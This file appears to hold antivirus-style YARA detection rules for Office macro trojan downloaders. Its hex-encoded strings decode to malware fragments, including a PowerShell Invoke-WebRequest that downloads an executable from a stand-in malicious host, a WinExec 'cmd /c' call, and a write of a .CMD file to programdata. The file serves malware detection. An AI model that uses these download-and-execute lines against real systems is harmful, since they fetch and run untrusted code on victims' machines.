
rule TrojanDownloader_O97M_Obfuse_PBA_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PBA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 20 28 22 70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 } //1 Shell ("powershell.exe
		$a_01_1 = {49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 68 74 74 70 3a 2f 2f 6d 61 69 6c 69 63 69 6f 75 73 2e 63 6f 6d 2f 66 69 6c 65 6d 61 6e 61 67 65 72 2e 65 78 65 20 2d 4f 75 74 46 69 6c 65 20 43 3a 5c 5c 66 69 6c 65 6d 61 6e 61 67 65 72 2e 65 78 65 } //1 Invoke-WebRequest http://mailicious.com/filemanager.exe -OutFile C:\\filemanager.exe
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Obfuse_PBA_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PBA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,07 00 07 00 07 00 00 "
		
	strings :
		$a_00_0 = {74 6d 70 54 6f 74 61 6c 20 3d 20 74 6d 70 54 6f 74 61 6c 20 2b 20 43 49 6e 74 28 4d 69 64 24 28 74 6d 70 53 74 72 2c 20 31 2c 20 31 29 29 } //1 tmpTotal = tmpTotal + CInt(Mid$(tmpStr, 1, 1))
		$a_00_1 = {74 6d 70 54 6f 74 61 6c 20 2b 20 43 49 6e 74 28 4d 69 64 24 28 22 34 32 31 30 35 38 39 36 33 32 22 2c 20 69 2c 20 31 29 } //1 tmpTotal + CInt(Mid$("4210589632", i, 1)
		$a_00_2 = {6a 20 3d 20 46 72 65 65 46 69 6c 65 } //1 j = FreeFile
		$a_00_3 = {4f 70 65 6e 20 28 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 4d 69 6c 6e 65 2e 43 4d 44 22 29 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 6a } //1 Open ("c:\programdata\Milne.CMD") For Output As #j
		$a_00_4 = {50 72 69 6e 74 20 23 6a 2c 20 57 44 46 52 54 56 47 42 59 48 42 45 44 52 46 54 47 59 48 2e 6d 6c 62 6c 2e 43 61 70 74 69 6f 6e 20 26 20 62 } //1 Print #j, WDFRTVGBYHBEDRFTGYH.mlbl.Caption & b
		$a_00_5 = {57 69 6e 45 78 65 63 20 22 63 6d 64 20 2f 63 } //1 WinExec "cmd /c
		$a_00_6 = {63 61 6c 63 4d 6f 64 75 6c 75 73 31 30 20 3d 20 74 6d 70 54 6f 74 61 6c } //1 calcModulus10 = tmpTotal
	condition:
		((#a_00_0  & 1)*1+(#a_00_1  & 1)*1+(#a_00_2  & 1)*1+(#a_00_3  & 1)*1+(#a_00_4  & 1)*1+(#a_00_5  & 1)*1+(#a_00_6  & 1)*1) >=7
 
}